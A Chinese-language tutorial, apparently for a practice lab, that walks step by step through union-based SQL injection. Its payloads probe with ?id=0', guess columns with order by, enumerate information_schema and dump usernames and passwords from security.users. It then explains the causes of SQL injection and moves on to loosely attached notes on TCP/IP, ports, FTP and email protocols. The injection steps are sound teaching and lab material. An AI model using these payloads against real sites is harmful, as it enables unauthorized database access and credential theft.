正题

所需要用到的SQL语法

?id=0’
order by
union select

第一步

我们在拿到一个网站首先需要知道这个网站是否存在sql注入的漏洞，我们可以用?id=0’先试一下

?id=0’

使用 ?id=0’如果数字0出现在报错信息中则为字符型,如果0没有出现，则为数字型

这里我们可以得到两个消息，第一个是该网站可以被sql注入第二个则是数据库使用的查询是字符型。

第二步

我们使用order by语句可以来猜列数
例如order by 1,5–+
这里的–+相当于一个’号因为字符型引号必须对应闭合所以使用–+来让整个语句正确

这里我们可以看见使用1，5太大了因为数据库中并没有5列
那么我们给它改小一点

现在的显示就证明确实可能有1-3的行列当然我们也可以再试一下4但是这道题确实只有3列所以不进行尝试了，在正常的sql注入中还是需要准确知道有多少行列。

第三步

我们现在可以使用 union select联合查询的sql语法对数据库中的数据进行查询，来获取数据库中用户信息或者其他我们感兴趣的信息。
?id=0’ union select 1,(select group_concat(查询的列名) from 从哪个数据库查询.从哪个表里查询),3 –+
例如：
?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+

为什么要使用?id=0’

因为我们需要使用一个不存在的id来让我们所需要的信息完整的呈现出来，也可以使用不在1到3之间的数值。

information_schema

这是MYSQL数据库里专门储备各种列表信息的一个数据库只要查询这里基本上可以获取数据库中各种列表的名字和信息。

第四步

我们可以看见有一个叫做security的列表security的中文是安全的意思所以我们可以推断一下里面可能有我们想要的账户信息
所以我们来尝试下进行sql注入来查询security内的所有表名
?id=0’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+

这里我们是在第二行进行搜索所以我们想要的信息会呈现在第二行

where table_schema=’security’

这里的sql语法是将security下的表名给我们呈现出来

第五步

我们可以看见有users是用户名的意思所以说里面会装着用户的密码和用户名
所以我们要用语句来获取所有users当中的列名
?id=0’ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+

第六步

可以看见第一行呈现出的users库下有两个列名
username和password顾名思义就是用户名和密码
所以我们要使用如下语句查询所有的用户名，密码
select group_concat(password) from security.users

select group_concat(username) from security.users
像这样插入
?id=0’ union select 1,(select group_concat(password) from security.users),(select group_concat(username) from security.users)–+

我们就得到了所有用户的密码和用户名

总结

在使用sql注入时一定要先判断该网站是否存在这样的一个sql注入的漏洞，这样就已经成功一半了，进而通过查询mysql特有的库‘information_schema’来获取所有库名通过库名来查询自己想要的信息。

什么是SQL注入

SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。利用现有应用程序，SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。

原理

SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。
SQL注入可以分为

平台层注入

不安全的数据库配置或数据库平台的漏洞所致

代码层注入

主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。

SQL注入的产生原因通常表现在以下几方面:

1.不当的类型处理;
2.不安全的数据库配置;
3.不合理的查询集处理;
4.不当的错误处理;
5.转义字符处理不合适;
6.多个提交处理不当。

攻击

当应用程序使用输入内容来构造动态sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。sql注入可能导致攻击者使用应用程序登陆在数据库中执行命令。相关的SQL注入可以通过测试工具pangolin进行。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造动态sql命令，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码，根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。

TCP互联网协议

互联网协议（Internet Protocol Suite）

1。互联网协议是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP/IP。
2.为该家族中最早通过的标准。由于在网络通讯协议普遍采用分层的结构，当多个层次的协议共同工作时，类似计算机科学中的堆栈，因此又被称为TCP/IP协议栈 。

三次握手

TCP作用（端口）

TCP段结构中端口地址都是16比特，可以有在0~65535范围内的端口号。对于这65536个端口号有以下的使用规定：
1.端口号小于256的定义为常用端口，服务器一般都是通过常用端口号来识别的。
2.客户端只需保证该端口号在本机上是惟一的就可以了。
3.客户端口号因存在时间很短暂又称临时端口号。

服务类型

FTP

1.允许用户从一台计算机到另一台取得文件，或发送文件到另外一台计算机。
2.从安全性方面考虑，需要用户指定一个使用其它计算机的用户名和口令。
3.一旦你要访问另一台系统中的文件，任何时刻都要运行FTP。而且只能拷贝文件到自己的机器中去来使用它。

SMTPPOP3电子邮件

1.为了发送电子邮件，邮件软件希望连接到目的计算机，如果是微电脑，也许它已关机，或者正在运行另一个应用程序呢?出于这种原因，通常由一个较大的系统来处理这些邮件，也就是一个一直运行着的邮件服务器。邮件软件成为用户从邮件服务器取回邮件的一个界面。
2.这些计算机好像在一起完成指定的任务，尽管有时看来像是只用到某个指定的计算机，但它是通过网络得到其它计算机系统的服务。服务器Server是为网络上其它提供指定服务的系统，客户Client是得到这种服务的另外计算机系统。（值得注意的是，服务/客户机不一定是不同的计算机，有可能是同一计算机中的不同运行程序）。以下是几种目前计算机上典型的一些服务，这些服务可在TCP/IP网络上调用。
